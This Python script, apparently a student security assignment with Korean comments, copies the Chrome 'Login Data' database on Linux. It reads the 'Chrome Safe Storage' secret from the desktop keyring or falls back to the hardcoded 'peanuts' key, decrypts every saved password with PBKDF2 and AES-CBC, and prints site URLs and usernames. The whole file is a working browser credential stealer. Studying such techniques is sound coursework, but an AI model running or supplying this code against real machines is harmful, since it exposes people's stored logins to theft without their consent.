

from Crypto.Cipher import AES
from Crypto.Protocol.KDF import PBKDF2
import sqlite3
import shutil
import glob
import json
import string
import secretstorage
import os


loginData = glob.glob(f'{os.path.expanduser("~")}/.config/google-chrome/Default/Login Data')    # login data  위치
def decryption (encrypted_pass):
    encrypted_value =encrypted_pass[3:]
    salt = b'saltysalt'	
    iv = b' ' * 16	# 난수
    length = 16	#길이
    iterations = 1	# 반복홧수
    my_pass = 'peanuts'.encode('utf8')	# 키를 peanuts를 utf8로 인코딩 후 저장
    

    if encrypted_pass[:3] == b'v11':	# v11일 경우	키를 secretstoage에서 가져와야함
        bus = secretstorage.dbus_init()					
        collection = secretstorage.get_default_collection(bus)
        for item in collection.get_all_items():
            if item.get_label() == 'Chrome Safe Storage':
                my_pass = item.get_secret()
                break
        key = PBKDF2(my_pass, salt, length, iterations)	# 키생성
        cipher = AES.new(key, AES.MODE_CBC, IV=iv)	# AES_CBC의 cipher를 생성
        decrypted = cipher.decrypt(encrypted_value)	# 복호화
        decrypted = decrypted.strip().decode()	# utf8을 디코딩
        decrypted = ''.join(i for i in decrypted if i in string.printable)	#한글자씩 저장
    else:	# v10일 경우 my_pass만 peanuts고 나머지는 같음
        key = PBKDF2('peanuts'.encode('utf8'), salt, length, iterations)
        cipher = AES.new(key, AES.MODE_CBC, IV=iv)
        decrypted = cipher.decrypt(encrypted_value)
        decrypted = decrypted.strip().decode()
        decrypted = ''.join(i for i in decrypted if i in string.printable)
    return decrypted

shutil.copy2(loginData[0], './login_vault.db')	# logindata가 여러개 일 수 있으니 첫번째 것 지정
with sqlite3.connect('./login_vault.db') as database:   # with 구문이 끝나면 이 database를 닫는다 like free
    cursor = database.cursor()  # 데이터 베이스와 상호작용을 위해 cursor 객체 사용
    db_items = cursor.execute(  # SQL 구문을 데이터 베이스 서버에 보내 가져 온것을 db_items에 저장
        'SELECT signon_realm, username_value, password_value FROM logins' # logins 테이블로부터 username_value와 password_value, oring_url로 되어 있는 것을 가져온다
    )
decrypted_list = []
for url,username, encrypted_pass in db_items.fetchall():   #  db_items의 모든 데이터를 가지고 와 for문
    if encrypted_pass and len(username) > 0:    # 암호화된 패스워드 길이와, ID가 없으면 굳이 복호화 할 필요 없음
        decrypted_list.append({     # uri와 id, password 복호화 된 것을 딕셔너리 형태로 decrypted_list 리스트에 삽입
            'origin_url': url,
            'username': username,
            'password': decryption(encrypted_pass)
        })

default = "\033[0m"
green = "\033[32m"
bold = "\033[1m"
red = "\033[31m"
for i, info in enumerate(decrypted_list):
    result = (
    f"{green}[{(i+1)}]{default}{bold} \n"
    f"URL:   {info['origin_url']} \n"
    f"User:  {info['username']} \n"
    # f"Pwd:   {info['password']} \n {default}"
    )
    print(result)
print(f"{bold}StudentID: {red}20183202")